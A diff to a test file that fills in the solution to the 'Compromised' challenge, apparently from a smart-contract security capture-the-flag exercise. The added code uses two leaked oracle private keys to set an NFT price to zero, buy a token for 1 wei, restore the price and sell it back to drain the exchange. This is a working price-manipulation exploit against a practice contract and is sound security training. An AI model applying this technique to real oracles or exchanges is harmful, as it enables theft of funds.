@@ -52,7 +52,23 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // In the task there are two hex strings. After decoding them as UTF-8 and then as base64 we get two eth private keys. 
+        // These are the oracles!
+        // Now we can manipulate the price, get a free NFT, manipulate the price again and sell it back to the exchange.
+        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const wallet1 = new ethers.Wallet(key1, ethers.provider);
+        const wallet2 = new ethers.Wallet(key2, ethers.provider);
+        await oracle.connect(wallet1).postPrice("DVNFT", 0);
+        await oracle.connect(wallet2).postPrice("DVNFT", 0);
+        expect(await oracle.getMedianPrice("DVNFT")).to.eq(0);
+        await exchange.connect(player).buyOne({value: 1});
+        tokenBought = await exchange.queryFilter(exchange.filters.TokenBought(player.address, null, null));
+        tokenId = tokenBought[0]["args"]["tokenId"];
+        await oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await oracle.connect(wallet2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        nftToken.connect(player).approve(exchange.address, tokenId);
+        await exchange.connect(player).sellOne(tokenId);
     });
 
     after(async function () {
